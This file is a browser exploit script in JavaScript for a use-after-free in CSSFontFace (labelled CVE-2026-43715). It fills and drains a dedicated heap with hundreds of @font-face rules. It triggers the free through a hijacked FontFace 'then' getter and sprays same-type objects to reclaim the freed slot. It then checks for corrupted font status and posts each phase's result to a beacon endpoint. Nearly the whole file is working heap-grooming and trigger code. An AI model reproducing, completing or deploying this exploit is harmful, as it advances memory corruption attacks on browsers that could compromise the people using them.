// p453-fontface-uaf-isoheap.js — CVE-2026-43715 UAF with IsoHeap exhaustion
//
// ROOT CAUSE: CSSFontFace uses WTF_MAKE_FAST_ALLOCATED_WITH_HEAP_IDENTIFIER
// → dedicated IsoHeap in libpas. ArrayBuffer spray CANNOT hit freed slot.
// FIX: Same-type spray after exhausting IsoHeap free space.
//
// Strategy:
//   Phase 1: Create 500 CSSFontFace objects to fill IsoHeap pages
//   Phase 2: Free half (250) to fill deallocation log + force flush
//   Phase 3: Trigger UAF via adopt()
//   Phase 4: Spray 200 new CSSFontFace objects → freed slot must be reused
//   Phase 5: Check spray faces for m_status = Success (UAF write)
(function() {
    var RUN = 'p453-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════════════════════
    // TEST A: IsoHeap exhaustion + same-type spray
    // ═══════════════════════════════════════════════════════════════
    try {
        // Phase 1: Fill the IsoHeap with CSSFontFace objects
        // Use unique family names so each gets its own CSSFontFace
        var fillerStyles = [];
        for (var i = 0; i < 500; i++) {
            var s = document.createElement('style');
            s.textContent = "@font-face { font-family: 'fill" + i + "'; src: local('Arial'); }";
            document.head.appendChild(s);
            fillerStyles.push(s);
        }
        document.body.offsetHeight; // process all 500 rules → 500 CSSFontFace objects

        B('A-FILLED', 'count=' + fillerStyles.length);

        // Phase 2: Remove half to force deallocation log processing
        // Removing styles triggers buildStarted/buildCompleted which frees CSSFontFaces
        for (var i = 0; i < 250; i++) {
            fillerStyles[i].remove();
        }
        document.body.offsetHeight; // process removal → 250 CSSFontFaces freed
        fillerStyles = fillerStyles.slice(250); // keep remaining 250

        B('A-FREED', 'removed=250,remaining=' + fillerStyles.length);

        // Re-fill to flush deallocation log (these allocs force log flush)
        var refillStyles = [];
        for (var i = 0; i < 250; i++) {
            var s = document.createElement('style');
            s.textContent = "@font-face { font-family: 'rf" + i + "'; src: local('Arial'); }";
            document.head.appendChild(s);
            refillStyles.push(s);
        }
        document.body.offsetHeight; // 250 new CSSFontFaces → reuse freed slots → flushes log

        B('A-REFILLED', 'count=' + refillStyles.length);

        // Remove refills too → more frees, log warmed
        for (var i = 0; i < refillStyles.length; i++) {
            refillStyles[i].remove();
        }
        document.body.offsetHeight;

        B('A-REFREED', 'done');

        // Now set up the target face
        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'p453a'; src: local('Arial'); }";
        document.head.appendChild(styleA);
        document.body.offsetHeight;

        var ruleA = styleA.sheet.cssRules[0];
        var faceA = null;
        var it = document.fonts.values();
        var e;
        while (!(e = it.next()).done) {
            if (e.value.family.replace(/['"]/g, '') === 'p453a') { faceA = e.value; break; }
        }

        if (!faceA) { B('A-DEAD', 'NO-FACE'); }
        else {
            var thenA = 0, aErr = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                if (thenA > 1) return undefined;
                try {
                    // Trigger adopt → free old CSSFontFace
                    ruleA.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;

                    // Remove remaining fillers to free MORE IsoHeap space
                    // This ensures dealloc log is full and flushed
                    for (var i = 0; i < fillerStyles.length; i++) {
                        fillerStyles[i].remove();
                    }
                    document.body.offsetHeight;

                    // NOW spray with same-type: freed slots include our target
                    // Use nonexistent fonts so they stay in Failure state
                    for (var i = 0; i < 300; i++) {
                        var s = document.createElement('style');
                        s.textContent = "@font-face { font-family: 'sp" + i + "'; src: local('ZZZZZ_NoFont_" + i + "'); }";
                        document.head.appendChild(s);
                    }
                    document.body.offsetHeight;
                } catch(e) { aErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceA.load(); } catch(e) { aErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-RESULT', {thenFired: thenA, err: aErr, statusAfter: faceA.status});

            // Check spray faces for unexpected "loaded" status
            // Spray faces used local('nonexistent') → should be "error"
            // UAF write sets m_status = Success → face shows "loaded"
            var loaded = [], errored = [], unloaded = [], other = [];
            var totalSp = 0;
            var it2 = document.fonts.values();
            var e2;
            while (!(e2 = it2.next()).done) {
                var fn = e2.value.family.replace(/['"]/g, '');
                if (fn.indexOf('sp') === 0 && fn.length <= 5) {
                    totalSp++;
                    var st = e2.value.status;
                    if (st === 'loaded') loaded.push(fn);
                    else if (st === 'error') errored.push(fn);
                    else if (st === 'unloaded') unloaded.push(fn);
                    else other.push(fn + ':' + st);
                }
            }
            B('A-CHECK', {
                total: totalSp,
                loaded: loaded.length,
                errored: errored.length,
                unloaded: unloaded.length,
                other: other.length,
                loadedNames: loaded.slice(0, 10),
                otherNames: other.slice(0, 5)
            });
        }
    } catch(e) { B('A-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: Tighter approach — exhaust then spray with ONE offsetHeight
    // Create fillers, free them all, trigger UAF, spray in same offsetHeight
    // ═══════════════════════════════════════════════════════════════
    try {
        // Fresh IsoHeap state: create and destroy 400 faces
        var warmup = [];
        for (var i = 0; i < 400; i++) {
            var s = document.createElement('style');
            s.textContent = "@font-face { font-family: 'w" + i + "'; src: local('Arial'); }";
            document.head.appendChild(s);
            warmup.push(s);
        }
        document.body.offsetHeight;
        for (var i = 0; i < warmup.length; i++) warmup[i].remove();
        document.body.offsetHeight;

        B('B-WARMED', 'freed=400');

        // Now create 200 more and free them → dealloc log full → flush
        var warm2 = [];
        for (var i = 0; i < 200; i++) {
            var s = document.createElement('style');
            s.textContent = "@font-face { font-family: 'w2" + i + "'; src: local('Arial'); }";
            document.head.appendChild(s);
            warm2.push(s);
        }
        document.body.offsetHeight;
        for (var i = 0; i < warm2.length; i++) warm2[i].remove();
        document.body.offsetHeight;

        B('B-FLUSHED', 'freed=200');

        // Target face
        var styleB = document.createElement('style');
        styleB.textContent = "@font-face { font-family: 'p453b'; src: local('Arial'); }";
        document.head.appendChild(styleB);
        document.body.offsetHeight;

        var ruleB = styleB.sheet.cssRules[0];
        var faceB = null;
        var itB = document.fonts.values();
        var eB;
        while (!(eB = itB.next()).done) {
            if (eB.value.family.replace(/['"]/g, '') === 'p453b') { faceB = eB.value; break; }
        }

        if (!faceB) { B('B-DEAD', 'NO-FACE'); }
        else {
            var thenB = 0, bErr = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenB++;
                if (thenB > 1) return undefined;
                try {
                    // Trigger adopt → free old CSSFontFace
                    ruleB.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;

                    // Immediately spray — IsoHeap is pre-exhausted, freed slot should be reused
                    for (var i = 0; i < 200; i++) {
                        var s = document.createElement('style');
                        s.textContent = "@font-face { font-family: 'tb" + i + "'; src: local('ZZZZZ_Nope_" + i + "'); }";
                        document.head.appendChild(s);
                    }
                    document.body.offsetHeight;
                } catch(e) { bErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceB.load(); } catch(e) { bErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('B-RESULT', {thenFired: thenB, err: bErr, statusAfter: faceB.status});

            var bLoaded = [], bTotal = 0;
            var itB2 = document.fonts.values();
            var eB2;
            while (!(eB2 = itB2.next()).done) {
                var fn = eB2.value.family.replace(/['"]/g, '');
                if (fn.indexOf('tb') === 0 && fn.length <= 5) {
                    bTotal++;
                    if (eB2.value.status === 'loaded') bLoaded.push(fn);
                }
            }
            B('B-CHECK', {total: bTotal, loaded: bLoaded.length, names: bLoaded.slice(0, 10)});
        }
    } catch(e) { B('B-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: Diagnostic — what status do nonexistent local() faces get?
    // Verify our detection assumption (should be "error" not "loaded")
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleC = document.createElement('style');
        styleC.textContent = "@font-face { font-family: 'diag1'; src: local('ZZZZZ_NonExist_Diag'); }";
        document.head.appendChild(styleC);
        document.body.offsetHeight;

        var diagFace = null;
        var itC = document.fonts.values();
        var eC;
        while (!(eC = itC.next()).done) {
            if (eC.value.family.replace(/['"]/g, '') === 'diag1') { diagFace = eC.value; break; }
        }

        if (diagFace) {
            B('C-DIAG', {family: 'diag1', status: diagFace.status});
            // Try loading it explicitly
            try {
                diagFace.load();
                B('C-AFTER-LOAD', {status: diagFace.status});
            } catch(e) {
                B('C-LOAD-ERR', e.message.slice(0, 100));
            }
        } else {
            B('C-DIAG', 'NOT-IN-FONTS');
        }
    } catch(e) { B('C-ERR', e.message.slice(0,100)); }

    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
